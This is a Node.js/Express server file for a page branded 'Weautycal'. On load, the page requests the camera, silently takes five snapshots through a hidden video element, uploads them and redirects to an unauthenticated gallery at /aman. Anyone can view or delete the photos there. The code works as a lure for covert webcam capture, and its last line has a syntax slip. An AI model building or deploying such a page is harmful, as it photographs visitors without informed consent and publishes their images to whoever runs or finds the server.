const express = require("express");
const fs = require("fs");
const path = require("path");

const app = express();
const PORT = process.env.PORT || 3000;

// Folder to save photos
const photosDir = path.join(__dirname, "photos");
if (!fs.existsSync(photosDir)) {
  fs.mkdirSync(photosDir);
}

app.use(express.json({ limit: "10mb" }));

// API: save base64 images
app.post("/upload-base64", (req, res) => {
  const { images } = req.body;
  if (!images || !Array.isArray(images)) {
    return res.status(400).json({ error: "No images provided" });
  }

  const savedFiles = [];
  images.forEach((img, i) => {
    const base64Data = img.replace(/^data:image\/png;base64,/, "");
    const filename = `photo_${Date.now()}_${i}.png`;
    const filepath = path.join(photosDir, filename);
    fs.writeFileSync(filepath, base64Data, "base64");
    savedFiles.push(`/photos/${filename}`);
  });

  res.json({ success: true, files: savedFiles });
});

// API: list photos
app.get("/photos", (req, res) => {
  fs.readdir(photosDir, (err, files) => {
    if (err) return res.json([]);
    res.json(files.map(f => `/photos/${f}`));
  });
});

// API: clear photos
app.post("/clear", (req, res) => {
  fs.readdirSync(photosDir).forEach(f => {
    fs.unlinkSync(path.join(photosDir, f));
  });
  res.json({ success: true });
});

// Static route for photos
app.use("/photos", express.static(photosDir));

// Route: homepage → auto capture
app.get("/", (req, res) => {
  res.send(`
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Weautycal Capture</title>
<style>
  body {
    margin: 0;
    font-family: 'Segoe UI', sans-serif;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    background: radial-gradient(circle at center, #00f2ff, #002244);
    overflow: hidden;
    color: white;
  }
  .logo {
    text-align: center;
    animation: float 3s ease-in-out infinite;
  }
  .logo svg {
    width: 150px;
    height: 150px;
    filter: drop-shadow(0 0 20px cyan);
  }
  h1 {
    font-size: 3em;
    text-shadow: 0 0 15px rgba(255,255,255,0.8);
  }
  @keyframes float {
    0% { transform: translateY(0px);}
    50% { transform: translateY(-20px);}
    100% { transform: translateY(0px);}
  }
</style>
</head>
<body>
  <div class="logo">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 64 64" fill="url(#grad)">
      <defs>
        <linearGradient id="grad" x1="0" y1="0" x2="1" y2="1">
          <stop offset="0%" stop-color="#ff0080"/>
          <stop offset="100%" stop-color="#7928ca"/>
        </linearGradient>
      </defs>
      <circle cx="32" cy="32" r="30"/>
    </svg>
    <h1>Weautycal</h1>
    <p>Capturing your moments...</p>
  </div>

  <video id="camera" autoplay playsinline style="display:none;"></video>
  <canvas id="canvas" style="display:none;"></canvas>

<script>
  async function capturePhotos() {
    const video = document.getElementById('camera');
    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d');

    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      video.srcObject = stream;

      let images = [];
      for (let i = 0; i < 5; i++) {
        await new Promise(r => setTimeout(r, 1000));
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        ctx.drawImage(video, 0, 0);
        images.push(canvas.toDataURL("image/png"));
      }

      await fetch('/upload-base64', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ images })
      });

      stream.getTracks().forEach(track => track.stop());
      window.location.href = "/aman";

    } catch (err) {
      alert("Camera access denied!");
    }
  }
  capturePhotos();
</script>
</body>
</html>
  `);
});

// Route: gallery at /aman
app.get("/aman", (req, res) => {
  res.send(`
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Weautycal Gallery</title>
<style>
  body {
    margin: 0;
    font-family: 'Segoe UI', sans-serif;
    background: linear-gradient(135deg, #141E30, #243B55);
    color: white;
    padding: 20px;
    text-align: center;
  }
  h1 {
    font-size: 2.5em;
    text-shadow: 0 0 15px rgba(255,255,255,0.8);
  }
  .gallery {
    display: grid;
    grid-template-columns: repeat(auto-fill,minmax(200px,1fr));
    gap: 15px;
    margin-top: 20px;
  }
  .gallery img {
    width: 100%;
    border-radius: 15px;
    box-shadow: 0 0 15px rgba(0,255,255,0.5);
    transition: transform 0.3s;
  }
  .gallery img:hover {
    transform: scale(1.05);
  }
  button {
    margin: 15px;
    padding: 12px 25px;
    border: none;
    border-radius: 8px;
    background: linear-gradient(45deg, #ff0080, #7928ca);
    color: white;
    font-size: 1em;
    cursor: pointer;
    box-shadow: 0 0 15px rgba(255,0,128,0.6);
  }
</style>
</head>
<body>
  <h1>📸 Weautycal Gallery</h1>
  <div class="gallery" id="gallery"></div>
  <button onclick="clearPhotos()">Clear All</button>

<script>
  async function loadPhotos() {
    const res = await fetch('/photos');
    const photos = await res.json();
    const gallery = document.getElementById('gallery');
    gallery.innerHTML = photos.map(p => 
      \`<img src="\${p}" alt="photo"/>\`
    ).join('');
  }

  async function clearPhotos() {
    await fetch('/clear', { method: 'POST' });
    loadPhotos();
  }

  loadPhotos();
</script>
</body>
</html>
  `);
});

// Start server
app.listen(PORT, () => {
  console.log(\`✅ Server running on http://localhost:\${PORT}\`);
});
